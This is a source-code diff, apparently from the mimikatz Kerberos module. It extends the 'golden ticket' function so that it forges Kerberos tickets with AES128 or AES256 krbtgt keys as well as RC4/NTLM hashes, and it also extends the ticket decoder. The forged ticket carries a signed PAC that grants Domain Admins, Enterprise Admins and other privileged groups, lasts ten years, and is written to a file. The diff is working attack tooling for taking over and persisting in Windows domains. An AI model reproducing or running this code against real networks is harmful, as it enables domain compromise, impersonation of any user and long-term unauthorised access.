@@ -240,9 +240,9 @@ wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE
 GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
-	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
-	DWORD i, j, nbGroups, id = 500;
-	PCWCHAR szUser, szDomain, szSid, szNTLM, szId, szGroups, base, filename;
+	BYTE key[AES_256_KEY_LENGTH] = {0};
+	DWORD i, j, nbGroups, id = 500, keyType, keyLen;
+	PCWCHAR szUser, szDomain, szSid, szKey, szId, szGroups, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
@@ -257,7 +257,39 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 			{
 				if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
 				{
-					if(kull_m_string_args_byName(argc, argv, L"krbtgt", &szNTLM, NULL))
+					if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
+					{
+						keyType = KERB_ETYPE_RC4_HMAC_NT;
+						keyLen = LM_NTLM_HASH_LENGTH;
+					}
+					else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
+					{
+						if(MIMIKATZ_NT_MAJOR_VERSION >= 6)
+						{
+							keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
+							keyLen = AES_128_KEY_LENGTH;
+						}
+						else
+						{
+							szKey = NULL;
+							PRINT_ERROR(L"aes128 only supported on NT6 or >\n");
+						}
+					}
+					else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
+					{
+						if(MIMIKATZ_NT_MAJOR_VERSION >= 6)
+						{
+							keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
+							keyLen = AES_256_KEY_LENGTH;
+						}
+						else
+						{
+							szKey = NULL;
+							PRINT_ERROR(L"aes256 only supported on NT6 or >\n");
+						}
+					}
+					
+					if(szKey)
 					{
 						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
 							id = wcstoul(szId, NULL, 0);
@@ -293,7 +325,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							groups = defaultGroups;
 							nbGroups = ARRAYSIZE(defaultGroups);
 						}
-						if(kull_m_string_stringToHex(szNTLM, ntlm, sizeof(ntlm)))												
+						if(kull_m_string_stringToHex(szKey, key, keyLen))
 						{
 							kprintf(
 								L"User      : %s\n"
@@ -305,10 +337,10 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 								kprintf(L"%u ", groups[i]);
 							kprintf(L"\nkrbtgt    : ");
 								
-							kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+							kull_m_string_wprintf_hex(key, keyLen, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
 							kprintf(L"-> Ticket : %s\n\n", filename);
 
-							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm, id, groups, nbGroups))
+							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, key, keyLen, keyType, id, groups, nbGroups))
 							{
 								if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
 									kprintf(L"\nFinal Ticket Saved to file !\n");
@@ -318,7 +350,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 						}
 						else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
 					}
-					else PRINT_ERROR(L"Missing krbtgt argument\n");
+					else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
 
 					LocalFree(pSid);
 				}
@@ -341,7 +373,6 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	NTSTATUS status;
 	PKERB_ECRYPT pCSystem;
 	PVOID pContext;
-	//DWORD bufferSize;
 
 	status = CDLocateCSystem(eType, &pCSystem);
 	if(NT_SUCCESS(status))
@@ -361,10 +392,8 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	}
 	return status;
 }
-#ifndef NTSECAPI_HEADER_FIXED
-const BYTE KerbFixedKey[16] = {0xde, 0xad, 0xc0, 0xde, 0x0e, 0xe0, 0xb0, 0x0b, 0xc0, 0xff, 0xee, 0x50, 0xba, 0xad, 0xf0, 0x0d}; // to be used when ntsecapi.h not fixed ! - http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader
-#endif
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE krbtgt, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
+
+PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
 {
 	NTSTATUS status;
 	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
@@ -372,6 +401,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	KERB_VALIDATION_INFO validationInfo = {0};
 	SYSTEMTIME st;
 	PPACTYPE pacType; DWORD pacTypeSize;
+	DWORD SignatureType;
 
 	GetSystemTime(&st); st.wMilliseconds = 0;
 
@@ -392,14 +422,10 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 
 	ticket.TicketFlags = KERB_TICKET_FLAGS_initial | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
 	ticket.TicketKvno = 2; // windows does not care about it...
-	ticket.TicketEncType = ticket.KeyType = KERB_ETYPE_RC4_HMAC_NT;
-	ticket.Key.Length = 16;
+	ticket.TicketEncType = ticket.KeyType = keyType;
+	ticket.Key.Length = keySize;
 	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
-	#ifdef NTSECAPI_HEADER_FIXED // when ntsecapi.h fixed ! - http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader
-		RtlGenRandom(ticket.Key.Value, ticket.Key.Length);
-	#else
-		RtlCopyMemory(ticket.Key.Value, KerbFixedKey, ticket.Key.Length);
-	#endif
+		CDGenerateRandomBits(ticket.Key.Value, ticket.Key.Length);
 	SystemTimeToFileTime(&st, &ticket.StartTime);
 	st.wYear += 10;
 	SystemTimeToFileTime(&st, &ticket.EndTime);
@@ -421,18 +447,31 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 
 	validationInfo.GroupCount = cbGroups;
 	validationInfo.GroupIds = groups;
+
+	switch(keyType)
+	{
+	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
+		SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES128;
+		break;
+	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
+		SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES256;
+		break;
+	case KERB_ETYPE_RC4_HMAC_NT:
+	default:
+		SignatureType = KERB_CHECKSUM_HMAC_MD5;
+	}
 	
-	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, &pacType, &pacTypeSize))
+	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, &pacType, &pacTypeSize))
 	{
 		kprintf(L" * PAC generated\n");
-		status = kuhl_m_pac_signature(pacType, pacTypeSize, krbtgt, LM_NTLM_HASH_LENGTH);
+		status = kuhl_m_pac_signature(pacType, pacTypeSize, key, keySize);
 		if(NT_SUCCESS(status))
 		{
 			kprintf(L" * PAC signed\n");
 			if(App_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
 			{
 				kprintf(L" * EncTicketPart generated\n");
-				status = kuhl_m_kerberos_encrypt(ticket.TicketEncType, KRB_KEY_USAGE_AS_REP_TGS_REP, krbtgt, LM_NTLM_HASH_LENGTH, App_EncTicketPart, kull_m_asn1_getSize(App_EncTicketPart), (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
+				status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, App_EncTicketPart, kull_m_asn1_getSize(App_EncTicketPart), (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
 				if(NT_SUCCESS(status))
 				{
 					kprintf(L" * EncTicketPart encrypted\n");
@@ -462,13 +501,31 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 {
 	NTSTATUS status;
-	BYTE ntlm[LM_NTLM_HASH_LENGTH];
-	PCWCHAR szNtlm, szIn, szOut, szOffset, szSize;
+	BYTE key[AES_256_KEY_LENGTH]; // max len
+	PCWCHAR szKey, szIn, szOut, szOffset, szSize;
 	PBYTE encData, decData;
-	DWORD encSize, decSize, offset = 0, size = 0;
+	DWORD keyType, keyLen, encSize, decSize, offset = 0, size = 0;
 
-	if(kull_m_string_args_byName(argc, argv, L"key", &szNtlm, NULL))
+
+	if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL))
 	{
+		keyType = KERB_ETYPE_RC4_HMAC_NT;
+		keyLen = LM_NTLM_HASH_LENGTH;
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
+	{
+		keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
+		keyLen = AES_128_KEY_LENGTH;
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
+	{
+		keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
+		keyLen = AES_256_KEY_LENGTH;
+	}
+	
+	if(szKey)
+	{
+		kprintf(L"Key is OK (%08x - %u)\n", keyType, keyLen);
 		if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
 		{
 			kull_m_string_args_byName(argc, argv, L"out", &szOut, L"out.kirbi");
@@ -483,9 +540,9 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 					size = wcstoul(szSize, NULL, 0);
 				}
 				
-				if(kull_m_string_stringToHex(szNtlm, ntlm, sizeof(ntlm)))												
+				if(kull_m_string_stringToHex(szKey, key, keyLen))												
 				{
-					status = kuhl_m_kerberos_encrypt(KERB_ETYPE_RC4_HMAC_NT, KRB_KEY_USAGE_AS_REP_TGS_REP, ntlm, LM_NTLM_HASH_LENGTH, encData + offset, offset ? size : encSize, (LPVOID *) &decData, &decSize, FALSE);
+					status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keyLen, encData + offset, offset ? size : encSize, (LPVOID *) &decData, &decSize, FALSE);
 					if(NT_SUCCESS(status))
 					{
 						if(kull_m_file_writeData(szOut, (PBYTE) decData, decSize))
@@ -502,7 +559,7 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 		}
 		else PRINT_ERROR(L"arg \'in\' missing\n");
 	}
-	else PRINT_ERROR(L"arg \'key\' missing\n");
+	else PRINT_ERROR(L"arg \'rc4\' or \'aes128\' or \'aes256\' missing\n");
 	return STATUS_SUCCESS;
 }
 #endif
